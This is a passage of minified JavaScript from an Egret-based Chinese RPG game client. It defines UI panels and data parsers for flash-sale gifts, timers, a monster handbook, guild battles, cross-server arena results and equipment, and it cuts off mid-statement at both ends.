t=this.data.data;this.img_icon.source=t.icon,this.lb_title.text=t.title,1==this.data.idx?this.lb_content.text=t.text[0]:2==this.data.idx?this.lb_content.text=t.text[1]:3==this.data.idx&&(this.lb_content.text=t.text[0]+t.text[1])},e.prototype.go=function(){var t=this.data.data;n.GlobalFun.jumpLink1(t.guideId),win.close(s.View_BianQiang)},e.prototype.clearAll=function(){this.img_icon.source="",this.lb_title.text="",this.lb_content.text=""},e}(o.BaseItemRender);e.Item_BianQiang=a,window.Item_BianQiang=a,__reflect(a.prototype,"Item_BianQiang",[]),window.Item_BianQiang=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameFlashSaleWin=void 0;var n=i(8),o=i(1),s=i(295),a=i(11),r=i(0),l=i(6),h=i(25),u=i(7),p=i(2),d=i(59),c=i(327),f=function(t){function e(){var e=t.call(this)||this;return e._sn_="GameFlashSaleSkin",e.rectClose=!1,e.layoutNum=LayoutNum.top,e._selIdx=0,e._isScaleMax=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.options.itemRenderer=c.GameFlashSaleItem,this._giftArr=new eui.ArrayCollection,this.options.dataProvider=this._giftArr,this.itemList.itemRenderer=a.ItemBase,this._rewardArr=new eui.ArrayCollection,this.itemList.dataProvider=this._rewardArr,this.addChangeEvent(this.options,this.onTabTouch),this.addTouchEvent(this.btnBuy,this.onClick),this.addTouchEvent(this.btnRect,this.onClickClose),this.PopUps.scaleX=this.PopUps.scaleY=.1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t&&t.length>0?t[0]:!1;i?(this.PopUps.scaleX=this.PopUps.scaleY=.1,this._isScaleMax=!1,egret.Tween.removeTweens(this.PopUps),egret.Tween.get(this.PopUps).to({scaleX:1,scaleY:1},300),s.TimerManager.ins().doTimerDelay(1e3,1e3,1,this.tweenMax,this)):(this.PopUps.scaleX=this.PopUps.scaleY=1,this._isScaleMax=!0),this.imgPayUnit.source="en"==urlParam.payUnit||"cn1"==urlParam.payUnit?"glashSale_price_icon1":"glashSale_price_icon",this.observe(d.GameFlashSaleCt.ins().postGiftInfoChange,this.flusGiftChange),this.flusGiftChange(),this.flusViewInfo()},e.prototype.tweenMax=function(){this._isScaleMax=!0},e.prototype.flusGiftChange=function(){var t=d.GameFlashSaleCt.ins().giftArr;this._giftArr.replaceAll(t.concat([])),this._giftArr.length>0&&(this._selIdx=0),this.options.visible=this._giftArr.length>1,this.flusViewInfo()},e.prototype.flusViewInfo=function(){var t=this._giftArr.source[this._selIdx];if(this._selVo=t,!t)return Timer.stop(this.timeHandler,this),void win.close(this);var e=r.GlobalConfig.TimeLimitGiftConfig[t.giftId];if(!e)return win.close(this),void Timer.stop(this.timeHandler,this);this._selCfg=e,this.title.source=e.title,this.background.source=e.background,this.gains.text=e.earnings+"%",this.prices0.text=h.Recharge.ins().getCashByRid(e.rid)/100+"",this._rewardArr.replaceAll(e.rewards.concat([]));var i=t.endTime-u.GameServerCC.serverTime;i>0?(this.time.text=n.DateUtils.getFormatBySecond(i/1e3,n.DateUtils.TIME_FORMAT_11),Timer.has(this.timeHandler,this)||Timer.start(1e3,0,this.timeHandler,this)):(this.time.text=gettext("00:00:00"),Timer.stop(this.timeHandler,this))},e.prototype.timeHandler=function(){var t=this._selVo.endTime-u.GameServerCC.serverTime;t>0?this.time.text=n.DateUtils.getFormatBySecond(t/1e3,n.DateUtils.TIME_FORMAT_11):(this.time.text=gettext("00:00:00"),Timer.stop(this.timeHandler,this))},e.prototype.onClick=function(t){if(this._selCfg){var e=this._selCfg,i=l.BagCT.ins().rockonNeedNum(e.rewards);if(l.BagCT.ins().getAllSurplusCount(i)<=0)return void p.TipsCT.ins().showTips(gettext("背包空间不足请扩容"));h.Recharge.ins().sendPayOrder(this._selCfg.rid),urlParam.debugTS&&console.log("ppp购买"+h.Recharge.ins().getCashByRid(this._selCfg.rid)/100+"元的礼包")}},e.prototype.onClickClose=function(){this._isScaleMax&&win.close(this)},e.prototype.onTabTouch=function(){this._selIdx=this.options.selectedIndex,this.flusViewInfo()},e.prototype.removeDisplay=function(){Timer.stop(this.timeHandler,this),s.TimerManager.ins().remove(this.tweenMax,this),this.PopUps&&egret.Tween.removeTweens(this.PopUps)},e}(o.BaseView);e.GameFlashSaleWin=f,window.GameFlashSaleWin=f,__reflect(f.prototype,"GameFlashSaleWin",[]),window.GameFlashSaleWin=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TimerManager=void 0;var n=i(50),o=i(55),s=function(t){function e(){var e=t.call(this)||this;return e.currHandler=null,e._handlers=[],e.nexthandles=null,e._currTime=egret.getTimer(),e._currFrame=0,egret.startTick(e.onEnterFrame,e),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.getFrameId=function(){return this._currFrame},e.prototype.getCurrTime=function(){return this._currTime},e.binFunc=function(t,e){return t.exeTime>e.exeTime?-1:t.exeTime<e.exeTime?1:0},e.DeleteHandle=function(t){t.clear(),ObjectPool.push(t)},e.prototype.onEnterFrame=function(t){this._currFrame++,this._currTime=egret.getTimer();var i=0,n=this.nexthandles;if(this.nexthandles=null,n&&n.length>0){for(var s=0,a=n;s<a.length;s++){var r=a[s];r.method.call(r.methodObj),e.DeleteHandle(r)}n=null}if(this._handlers.length<=0)return!1;for(var l=this._handlers[this._handlers.length-1];l.exeTime<=this._currTime;){this.currHandler=l=this._handlers.pop(),l.method.call(l.methodObj),i=egret.getTimer(),l.exeTime=i+l.delay;var h=l.forever;if(h||(l.repeatCount>1?(l.repeatCount--,h=!0):l.onFinish&&l.onFinish.apply(l.finishObj)),h){var u=o.Algorithm.binSearch(this._handlers,l,e.binFunc);this._handlers.splice(u,0,l)}else e.DeleteHandle(l);if(i-this._currTime>5)break;if(this._handlers.length<=0)break;l=this._handlers[this._handlers.length-1]}return this.currHandler=null,!1},e.prototype.create=function(t,i,n,s,a,r,l){if(!(0>i||0>n||null==s)){var h=ObjectPool.pop("TimeHandle");h.forever=0==n,h.repeatCount=n,h.delay=i,h.method=s,h.methodObj=a,h.onFinish=r,h.finishObj=l,h.exeTime=t+this._currTime;var u=o.Algorithm.binSearch(this._handlers,h,e.binFunc);this._handlers.splice(u,0,h)}},e.prototype.doTimer=function(t,i,n,o,s,a){void 0===s&&(s=null),void 0===a&&(a=null),e.ins().isExists(n,o)||this.create(t,t,i,n,o,s,a)},e.prototype.doTimerDelay=function(t,e,i,n,o,s,a){void 0===s&&(s=null),void 0===a&&(a=null),this.create(t,e,i,n,o,s,a)},e.prototype.doNext=function(t,e){var i=ObjectPool.pop("TimeHandle");i.method=t,i.methodObj=e,this.nexthandles||(this.nexthandles=[]),this.nexthandles.push(i)},e.prototype.remove=function(t,i){var n=this.currHandler;n&&n.method==t&&n.methodObj==i&&(n.forever=!1,n.repeatCount=0);for(var o=this._handlers.length-1;o>=0;o--){var s=this._handlers[o];s.method==t&&s.methodObj==i&&(this._handlers.splice(o,1),e.DeleteHandle(s))}},e.prototype.removeAll=function(t){var i=this.currHandler;i&&i.methodObj==t&&(i.forever=!1,i.repeatCount=0);for(var n=this._handlers.length-1;n>=0;n--){var o=this._handlers[n];o.methodObj==t&&(this._handlers.splice(n,1),e.DeleteHandle(o))}},e.prototype.isExists=function(t,e){for(var i=0,n=this._handlers;i<n.length;i++){var o=n[i];if(o.method==t&&o.methodObj==e)return!0}return!1},e}(n.BaseClass);e.TimerManager=s,window.TimerManager=s,__reflect(s.prototype,"TimerManager",[]);var a=function(){function t(){this.delay=0,this.forever=!1,this.repeatCount=0,this.exeTime=0}return t.prototype.clear=function(){this.method=null,this.methodObj=null,this.onFinish=null,this.finishObj=null,this.forever=!1},t}();window.TimeHandle=a,__reflect(a.prototype,"TimeHandle",[]),window.TimerManager=s,window.TimeHandle=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BookPanel=void 0;var n=i(1),o=i(22),s=i(0),a=i(15),r=i(20),l=i(31),h=i(43),u=i(12),p=i(2),d=i(307),c=i(679),f=i(680),g=i(681),m=function(t){function e(){var e=t.call(this)||this;return e._sn_="BookPanelSkin",e.sData=new eui.ArrayCollection,e.bData=new eui.ArrayCollection,e.iData=new eui.ArrayCollection,e.oIndex=-1,e.listId=-1,e.bolGoRed=!1,e._sn_="BookPanelSkin",e}return __extends(e,t),e.getSysId=function(){return-1},e.prototype.skinComplete=function(){this.bookBar.itemRenderer=c.BookBarItem,this.bookLst.itemRenderer=f.BookShowItem,this.listAward.itemRenderer=g.ItemNum,d.Book.ins().selectBookId=10001},e.prototype.addDisplay=function(){this.bookBar.selectedIndex=0,this.typeTab.selectedIndex=0,this.bolGoRed=!0,this.addTouchEndEvent(this.btnUp,this.onClick),this.bookBar.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onBookBarTap,this),this.addChangeEvent(this.typeTab,this.onTypeTabTouch),this.bookLst.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onBookTap,this),d.Book.ins().sendInfo(d.Book.ins().selectBookId),observe(this,this.updateBookList,d.Book.ins().postBook)},e.prototype.removeDisplay=function(){this.skin&&(this.removeObserve(),this.removeTouchEvent(this.btnUp,this.onClick))},e.prototype.updateBookList=function(){var t=[],e=s.GlobalConfig.HandbookConfig,i=-1;for(var n in e){var o=e[n],a=d.Book.ins().listRed(o.id),r={id:o.id,icon:"tujian_"+o.mapid,mapname:o.mapname,showRed:a,type:o.type};r.type==this.typeTab.selectedIndex+1&&(t.push(r),0>i&&a&&this.bolGoRed&&(d.Book.ins().selectBookId=r.id,i=t.length-1))}this.sData.replaceAll(t),i>=0&&(this.bookBar.selectedIndex=i),this.setBooklistData(d.Book.ins().selectBookId),this.bolGoRed=!1},e.prototype.setBooklistData=function(t){this.oIndex!=d.Book.ins().selectBookId&&(this.bookLst.selectedIndex=0),this.oIndex=d.Book.ins().selectBookId;var e=s.GlobalConfig.HandbookConfig,i=s.GlobalConfig.HandbookListConfig,n=e[t].list,o=d.Book.ins().bookdir[t];if(o){for(var a=[],r=-1,l=0;l<n.length;l++)if(o[l]){var h=n[l],u=0==o[l].lv?o[l].lv+1:o[l].lv,p=d.Book.ins().singleBookRed(this.oIndex,l),c=i[h][u],f={icon:c.icon,bookName:c.name,lv:o[l].lv,showRed:p};a.push(f),0>r&&p&&(r=a.length-1)}this.bData=new eui.ArrayCollection(a),r>=0&&(this.bookLst.selectedIndex=r),this.setBookData(),this.updateTabRp()}},e.prototype.setBookData=function(){var t=d.Book.ins().selectBoodIndex=this.bookLst.selectedIndex;this.showRed.visible=d.Book.ins().singleBookRed(this.oIndex,t);var e=s.GlobalConfig.HandbookConfig,i=s.GlobalConfig.HandbookListConfig,n=e[this.oIndex].list,a=d.Book.ins().bookdir[this.oIndex],r=n[t],h=a[t].lv+1,u=i[r][h]?i[r][h]:i[r][a[t].lv];this.bookName.text=""+u.name,this.bookDesc.text=""+u.desc;var p=a[t].num,c=u.nums,f=p>=c?"#40D016":"#B1B097";this.killDesc.textFlow=(new egret.HtmlTextParser).parser(gettext('击杀{0}只{1} <font color="{2}">({3}/{4})</font>',c,u.name,f,p,c));var g=[],m="",v=u.attr;m=window.getAttrShowStr(i[r][h]?i[r][h-1]?.attr:void 0,v),this.lbAttr.textFlow=(new egret.HtmlTextParser).parse(m),this.iData.replaceAll(g);var y=s.GlobalConfig.ItemConfig[u.award[0].id],C=y?y.icon:l.ITEM_ICON[l.ITEM_TYPE[u.award[0].id]]||"";this.costCm.setShow(C,u.award[0].count);var T="";T=a[t].num<u.nums?gettext("传送"):a[t].lv>0?gettext("升级"):gettext("激活"),this.btnUp.label=T,this.btnUp.touchEnabled=i[r][h]?!0:!1,this.btnUp.touchEnabled||(this.btnUp.label=gettext("已满级"))},e.prototype.onBookBarTap=function(t){var e=t.item.id;this.oIndex!=e&&d.Book.ins().sendInfo(e)},e.prototype.onBookTap=function(t){this.setBookData()},e.prototype.onTypeTabTouch=function(t){this.updateBookList();var e=this.sData.source[0].id;this.oIndex!=e&&(this.bolGoRed=!0,d.Book.ins().sendInfo(e)),this.bookBar.scrollV=0},e.prototype.onClick=function(t){var e,i=d.Book.ins().bookdir[this.oIndex],n=s.GlobalConfig.HandbookListConfig,o=s.GlobalConfig.HandbookConfig,a=o[this.oIndex].list,l=this.bookLst.selectedIndex,u=a[l],c=i[l].lv+1,f=n[u][c]?n[u][c]:n[u][i[l].lv];if(i[l].num<f.nums){if(!(null===(e=n[u][c])||void 0===e?void 0:e.mapId))return;return n[u][c].mapId==r.GameMap.fubenID?void p.TipsCT.ins().showTips(gettext("已在当前地图")):void h.CityCC.ins().sendCityGo(1,n[u][c].mapId)}this.bolGoRed=!0,d.Book.ins().sendup(this.oIndex,u)},e.prototype.updateTabRp=function(){for(var t=s.GlobalConfig.HandbookConfig,e=0;e<this.typeTab.numElements;e++){var i=this.typeTab.getElementAt(e);i.eRp&&(i.eRp.visible=!1);for(var n in t){var o=t[n],a=d.Book.ins().listRed(o.id),r={id:o.id,icon:"tujian_"+o.mapid,mapname:o.mapname,showRed:a,type:o.type};
if(r.type==e+1&&a){i.eRp&&(i.eRp.visible=!0);break}}}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=u.OpenSystem.ins().checkSysOpen(a.SystemType.BOOK);return i||p.TipsCT.ins().showTips(u.OpenSystem.ins().getNoOpenTips(a.SystemType.BOOK)),i},e.prototype.tabRp=function(){return d.Book.ins().allRp()},e.prototype.clearPanel=function(){},e}(n.BaseView);e.BookPanel=m,window.BookPanel=m,__reflect(m.prototype,"BookPanel",[]),window.BookPanel=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ChatCampData=void 0;var n=i(205),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.readData=function(t){void 0===t&&(t=null),this.type=t.readShort(),this.servId=t.readInt(),this.name=t.readString(),this.content=t.readString()},e}(n.ChatDataBase);e.ChatCampData=o,window.ChatCampData=o,__reflect(o.prototype,"ChatCampData",[]),window.ChatCampData=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestMateItem=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="ContestMateItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){this.skin&&this.data&&(this.txtName.text=this.data.name)},e}(n.BaseItemRender);e.ContestMateItem=o,window.ContestMateItem=o,__reflect(o.prototype,"ContestMateItem",[]),window.ContestMateItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuileBattleReliveWin=void 0;var n=i(8),o=i(1),s=i(7),a=i(51),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.rectClose=!1,e._sn_="SwitchCDSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];switch(this.type=t[0],this.sceneIndex=t[1],this.act.text=gettext("即将退出沙城争霸活动"),this.type){case 1:this.currentState="switch",this.s=a.GuildBattleCT.ins().getModel().getCdByType(this.type),this.defaultStr=gettext("秒后自动切换区域");break;case 2:this.currentState="revive",this.s=t[1],this.defaultStr=gettext("秒后在沙城城门复活");break;case 3:this.currentState="exit",this.s=a.GuildBattleCT.ins().getModel().getCdByType(this.type),this.defaultStr=gettext("秒后自动退出活动");break;case 4:this.currentState="exit",this.act.text=gettext("即将退出圣灵禁地"),this.defaultStr=gettext("秒后即将退出圣灵禁地");break;case 5:var i=t[2];this._killerName=i.killerName,this.currentState="revive",this.s=Math.floor((n.DateUtils.formatMiniDateTime(i.cd)-s.GameServerCC.serverTime)/1e3),this.defaultStr=gettext("秒后复活")}this.addTouchEvent(this.closeBtn,this.onTap),this.timeDown.text=""+this.s+this.defaultStr,Timer.stop(this.updateCloseBtnLabel,this),Timer.start(1e3,this.s,this.updateCloseBtnLabel,this),this.refushMapInfo()},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeTouchEvent(this.closeBtn,this.onTap),Timer.stop(this.updateCloseBtnLabel,this),1!=this.type&&(a.GuildBattleCT.ins().getModel().killName="")},e.prototype.refushMapInfo=function(){1==this.type?this.mapName.text=a.GuildBattleCT.ins().getModel().getNextMapName(this.sceneIndex):2==this.type?(this.killName.text=gettext("你被 {0} 击败！",a.GuildBattleCT.ins().getModel().killName),this.guildName.text=gettext("所属公会：{0} ",a.GuildBattleCT.ins().getModel().killGuild)):5==this.type&&(this.killName.text=gettext("你被 {0} 击败！",this._killerName),this.guildName.text="")},e.prototype.updateCloseBtnLabel=function(){this.s--,this.s<=0&&(1==this.type&&a.GuildBattleCT.ins().requestPlayNextMap(this.sceneIndex),3==this.type&&send(Ts.exitFB),win.close(this)),this.timeDown.text=""+this.s+this.defaultStr},e.prototype.onTap=function(t){switch(t.currentTarget){case this.closeBtn:win.close(e)}},e}(o.BaseView);e.GuileBattleReliveWin=r,window.GuileBattleReliveWin=r,__reflect(r.prototype,"GuileBattleReliveWin",[]),window.GuileBattleReliveWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.NoticeView=void 0;var n=i(1),o=i(103),s=i(61),a=i(5),r=function(t){function e(){var e=t.call(this)||this;return e.list=[],e.startX=0,e.endX=0,e.defaultRect=!1,e.layoutNum=LayoutNum.top,e.frame=new eui.Image,e.frame.source="zjmgonggaobg",e.frame.width=480,e.frame.height=28,e.frame.y=240,e.frame.x=o.StageUtils.ins().getWidth()/2-e.frame.width/2,e.addChild(e.frame),e.frame.visible=!1,e.touchChildren=!1,e.touchEnabled=!1,e.startX=e.frame.x+e.frame.width,e.endX=e.frame.x,e}return __extends(e,t),e.prototype.removeDisplay=function(){egret.Tween.removeTweens(this)},e.prototype.showNotice=function(t){if(!1){this.frame.visible=!0;var e=new eui.Label;e.size=20,e.textColor=16705792,e.stroke=1,e.strokeColor=0,e.x=this.startX,e.y=this.frame.y+4,e.textFlow=a.TextFlowMaker.generateTextFlow(t),this.addChild(e),this.list.push(e),e.visible=!1,1==this.list.length&&this.tweenLab()}},e.prototype.tweenLab=function(){var t=this,e=this.list[0],i=this.endX-e.width,n=egret.Tween.get(e);e.visible=!0,n.to({x:i},20*e.width).call(function(){t.removeChild(e),t.list.shift(),t.list.length<1?t.frame.visible=!1:t.tweenLab()},this)},e}(n.BaseView);e.NoticeView=r,window.NoticeView=r,__reflect(r.prototype,"NoticeView",[]),window.NoticeView=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaData=void 0;var n=function(){function t(t){this.killNum=0,this.aidNum=0,this.collectNum=0,this.curScore=0,this.curGetScore=0,this.totalScore=0,this.arenaScore=0,t&&this.readData(t)}return t.prototype.readData=function(t){this.servId=t.readInt(),this.campId=t.readByte(),this.actorid=t.readInt(),this.playerName=t.readString(),this.killNum=t.readShort(),this.aidNum=t.readShort(),this.collectNum=t.readShort(),this.curScore=t.readShort(),this.curGetScore=t.readShort(),this.totalScore=t.readInt(),this.arenaScore=t.readShort(),this.isFirstKiller=t.readBoolean(),this.isFirstCollect=t.readBoolean(),this.isMvp=t.readBoolean(),this.isOnWin=t.readBoolean(),this.isDeserter=t.readBoolean()},t.prototype.readRankData=function(t){this.servId=t.readInt(),this.campId=t.readByte(),this.actorid=t.readInt(),this.playerName=t.readString(),this.killNum=t.readShort(),this.aidNum=t.readShort(),this.collectNum=t.readShort(),this.curScore=t.readShort(),this.totalScore=t.readInt()},t}();e.KfArenaData=n,window.KfArenaData=n,__reflect(n.prototype,"KfArenaData",[]),window.KfArenaData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaRankData=void 0;var n=function(){function t(t){this.rank=t.readInt(),this.playerId=t.readInt(),this.score=t.readInt(),this.vip=t.readInt(),this.playerName=t.readString(),this.dan=t.readInt(),this.servId=t.readInt(),this.job=t.readByte(),this.power=t.readDouble()}return t}();e.KfArenaRankData=n,window.KfArenaRankData=n,__reflect(n.prototype,"KfArenaRankData",[]),window.KfArenaRankData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KFInviteType=e.KFInviteData=void 0;var n=function(){function t(){}return t.prototype.parse=function(t){this.roleId=t.readInt(),this.name=t.readString(),this.power=t.readInt(),this.score=t.readInt(),this.winRate=t.readInt()/100>>0},t}();e.KFInviteData=n,window.KFInviteData=n,__reflect(n.prototype,"KFInviteData",[]),window.KFInviteData=n;var o;!function(t){t[t.Friend=0]="Friend",t[t.Guild=1]="Guild"}(o=e.KFInviteType||(e.KFInviteType={})),window.KFInviteType=o,window.KFInviteType=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaResultWin=void 0;var n=i(1),o=i(11),s=i(651),a=i(47),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="KfArenaResultSkin",e.QUIT_T=30,e}return __extends(e,t),e.prototype.skinComplete=function(){this.extrReward.itemRenderer=o.ItemBase,this.list.itemRenderer=s.KfArenaResultDataItem},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.bgClose,this.onTouch),this.addTouchEvent(this.sureBtn,this.onTouch);var i=t[0],n=t[1],o=t[2],s=t[3],r=t[4],l=t[5];if(this._winType=l,1==this._winType){this.currentState="result",3==i?(this.blueResult.source="tag_draw",this.redResult.source="tag_draw",this.loseMask0.visible=!1,this.loseMask1.visible=!1):i==a.KfArenaSys.ins().myCampId?(this.blueResult.source="tag_win",this.redResult.source="tag_lose",this.loseMask0.visible=!1,this.loseMask1.visible=!0):(this.blueResult.source="tag_lose",this.redResult.source="tag_win",this.loseMask0.visible=!0,this.loseMask1.visible=!1),1==a.KfArenaSys.ins().myCampId?(this.blueScore.text=n+"",this.redScore.text=o+""):(this.blueScore.text=o+"",this.redScore.text=n+"");for(var h=s,u=0,p=h;u<p.length;u++){var d=p[u];d.winType=this._winType}this.list.dataProvider=new eui.ArrayCollection(h),this.extrReward.dataProvider=new eui.ArrayCollection(r),this.quitTime=egret.getTimer()+1e3*this.QUIT_T,Timer.has(this.onTime,this)||Timer.start(1e3,0,this.onTime,this)}else this.currentState="info",a.KfArenaSys.ins().sendDataInfo(),this.observe(a.KfArenaSys.ins().postDataInfo,this.flusFightInfo)},e.prototype.flusFightInfo=function(t){for(var e=0,i=t;e<i.length;e++){var n=i[e];n.winType=this._winType}this.list.dataProvider=new eui.ArrayCollection(t);var o=a.KfArenaSys.ins();1==o.myCampId?(this.blueScore.text=o.scoreA+"",this.redScore.text=o.scoreB+""):(this.blueScore.text=o.scoreB+"",this.redScore.text=o.scoreA+"")},e.prototype.onTouch=function(t){switch(t.target){case this.bgClose:case this.sureBtn:this.onExit()}},e.prototype.onTime=function(){var t=(this.quitTime-egret.getTimer())/1e3>>0;(this.onExit(),Timer.stop(this.onTime,this))},e.prototype.onExit=function(){1==this._winType&&send(Ts.exitFB),win.close(this)},e}(n.BaseView);e.KfArenaResultWin=r,window.KfArenaResultWin=r,__reflect(r.prototype,"KfArenaResultWin",[]),window.KfArenaResultWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataLadder=void 0;var n=i(81),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.parser=function(t,e){this.id=t.readInt(),this.player=t.readString(),this.challgeLevel=t.readInt(),this.challgeId=t.readInt(),this.winNum=t.readInt(),this.job=t.readByte(),this.sex=t.readByte()},e}(n.RankDataBase);e.RankDataLadder=o,window.RankDataLadder=o,__reflect(o.prototype,"RankDataLadder",[]),window.RankDataLadder=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GodWingData=void 0;var n=i(0),o=i(165),s=function(){function t(){this.data={},this.keYinLv=0,this.keYinExp=0,this.keYinSuitLv=0,this.suitLevel=0}return t.prototype.parser=function(t){for(var e=t.readShort(),i=0;e>i;i++){var n=t.readShort(),o=t.readInt();this.data[n]={slot:n,level:o}}},t.prototype.getLevel=function(t){return this.data[t]?this.data[t].level:0},t.prototype.getData=function(){return this.data},t.prototype.getSuitLevel=function(){var t=Number.MAX_VALUE,e=0;for(var i in this.data)this.data[i].level<t&&(e=this.data[i].slot,t=this.data[i].level);return e&&t?this.suitLevel:0},t.prototype.getSuitLevelByEquip=function(){var t=Number.MAX_VALUE,e=0;for(var i in this.data)this.data[i].level<t&&(e=this.data[i].slot,t=this.data[i].level);if(!e||!t)return 0;var s=n.GlobalConfig.GodWingLevelConfig[t][e];if(!s)return 0;var a=[];for(var r in n.GlobalConfig.GodWingItemConfig){var l=n.GlobalConfig.GodWingItemConfig[r];if(a.length>=o.WingEnum.GodWingMaxSlot)break;l.level>=s.level&&s.slot!=l.slot&&this.data[l.slot]&&this.data[l.slot].level>=l.level&&a.push(l.itemId)}return a.length>=o.WingEnum.GodWingMaxSlot-1?t:0},t.prototype.getSuitSum=function(){var t=this.getSuitLevel(),e=0;for(var i in this.data)this.data[i].level>=t&&e++;return e},t}();e.GodWingData=s,window.GodWingData=s,__reflect(s.prototype,"GodWingData",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BookData=e.Book=void 0;var n=i(14),o=i(0),s=i(13),a=i(17),r=function(t){function e(){var e=t.call(this)||this;return e.selectBookId=10001,e.selectBoodIndex=0,e.bookdir={},e.allBookRed=new a.RedPoint,e.sysId=PackageID.Book,e.regNetMsg(5,e.getcbInfo),observe(e,e.initRed,s.SubRoles.ins().doSubRole),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.getBookPowerNumEx=function(){return 0},e.prototype.sendInfo=function(t){var e=this.getBytes(5);e.writeShort(t),this.sendToServer(e)},e.prototype.getcbInfo=function(t){var e=[],i=t.readInt(),n=t.readInt();if(this.bookdir[i])if(1==n)for(var o=t.readInt(),s=0;s<this.bookdir[i].length;s++){var a=this.bookdir[i][s];if(a&&a.listId==o){var r=t.readInt(),h=t.readInt();a.lv=r,a.num=h;break}}else for(var s=0;n>s;s++)this.bookdir[i]&&this.bookdir[i][s]&&this.bookdir[i][s].parser(t);else{this.bookdir[i]=[];for(var s=0;n>s;s++){var u=new l;u.parser(t),e.push(u)}this.bookdir[i]=e}this.selectBookId=i,this.postBook()},e.prototype.sendup=function(t,e){var i=this.getBytes(6);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},e.prototype.postBook=function(){},e.prototype.initRed=function(){var t=this;this.allBookRed=new a.RedPoint(function(){return t.allRp()},this.postBook),this.allBookRed.v=this.allRp()},e.prototype.allRp=function(){for(var t in this.bookdir){var e=this.listRed(parseInt(t));if(e)return!0}return!1},e.prototype.listRed=function(t){var e=this.bookdir[t];if(!e)return!1;for(var i=0;i<e.length;i++){var n=this.singleBookRed(t,i);if(n)return!0}return!1},e.prototype.singleBookRed=function(t,e){if(!this.bookdir[t])return!1;var i=this.bookdir[t][e];if(!i||!o.GlobalConfig.HandbookListConfig[i.listId])return!1;var n=o.GlobalConfig.HandbookListConfig[i.listId][i.lv+1];if(!n)return!1;var s=i.num,a=n.nums;return s>=a?!0:!1},__decorate([post()],e.prototype,"postBook",null),e}(n.BaseSystem);e.Book=r,window.Book=r,__reflect(r.prototype,"Book",[]);var l=function(){function t(){}return t.prototype.parser=function(t){this.listId=t.readInt(),this.lv=t.readInt(),this.num=t.readInt()},t}();e.BookData=l,window.BookData=l,__reflect(l.prototype,"BookData",[]),window.BookData=l,Systemap.Book=function(){return r.ins()},window.Book=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ExtremeEquipPanel=void 0;var n=i(21),o=i(18),s=i(5),a=i(1),r=i(22),l=i(0),h=i(13),u=i(6),p=i(10),d=i(62),c=i(38),f=i(86),g=i(65),m=i(2),v=i(126),y=i(72),C=i(682),T=i(12),b=i(15),w=i(67),I=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.extreme_eff_bottom=new eui.Group,e.items=[],e.curIndex=0,e._sn_="ExtremeEquipSkin",e.latterTime=100,e}return __extends(e,t),e.prototype.skinComplete=function(){for(var t=0;this["pos"+t];)this.items.push(this["pos"+t]),t++;this.addTouchEvent(this.updateBtn,this.update),this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=this,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];observe(this,this.undateView,c.EquipCT.ins().postZhiZunUpgrade,u.BagCT.ins().postItemAdd,u.BagCT.ins().postItemDel,u.BagCT.ins().postItemChange);for(var n=0;n<this.items.length;n++)this.addTouchEvent(this["pos"+n],this.onListChange),this["pos"+n].setSelect(this.curIndex==n);setTimeout(function(){t.setRoleId(t.curRole),t.latterTime=0},this.latterTime)},e.prototype.onClick=function(t){var e,i,n,o,s,a=this.curIndex;switch(t.target){case this.skillIcon0:e=v.ExtremeEquipCC.getZhiZunLinkLevelConfig(a),n=v.ExtremeEquipCC.getZhiZunLv(a),i=v.ExtremeEquipCC.getZhiZunEquipLevelConfig(a,n),o=l.GlobalConfig.SkillsConfig[i.skillId],s=g.SkillUtil.getDesc(o),win.open("YupeiSkillTipsWin",g.SkillUtil.getName(o)+("Lv."+e.level),s);break;case this.chainImg0:e=v.ExtremeEquipCC.getZhiZunLinkLevelConfig(a),win.open("YupeiSkillTipsWin",gettext("灵魂锁链")+("Lv."+e.level),e.chainDesc);break;case 